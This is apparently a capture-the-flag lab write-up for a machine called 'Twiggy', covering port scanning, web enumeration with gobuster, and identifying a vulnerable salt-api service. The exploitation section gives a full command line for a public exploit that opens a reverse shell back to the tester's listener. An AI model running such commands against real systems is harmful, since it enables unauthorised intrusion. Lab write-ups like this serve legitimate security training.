Twiggy

Target IP: 192.168.170.62

Scanning



There are six TCP ports open on the target machine.

Enumeration

Port 80: HTTP

Running the command gobuster dir -u http://192.168.170.62/ -w /usr/share/wordlists/dirb/big.txt -s 200 -b "" outputs one result: /sitemap.xml. The result of this file are shown above. There is some sort of redirection going on because the result above points to 8000 port.

Port 8000: HTTP

Browsing to this port displays the webpage above. This application seems to be a REST API.


If an incorrect parameter is passed to the URL. We get the technology name and version used which is CherryPy 5.6.0. However, Googling this did not result in anything useful.


However, when using curl against the port, I got an interesting header-field X-Upstream: salt-api/3000-1. And this application is vulnerable to RCE.

Exploitation & Flag


I came across the Github repository above while searching for the exploit. Then I downloaded the code on my machine. I started a listener on port 80 for the reverse shell connection. Using the command python3 exp.py --master 192.168.170.62 --port 4506 -lh 192.168.45.173 -lp 80 --exec-choose master, I gained a reverse shell.


The top terminal above shows the exploit being run. The bottom terminal shows the reverse shell connection along with the proof.txt flag.
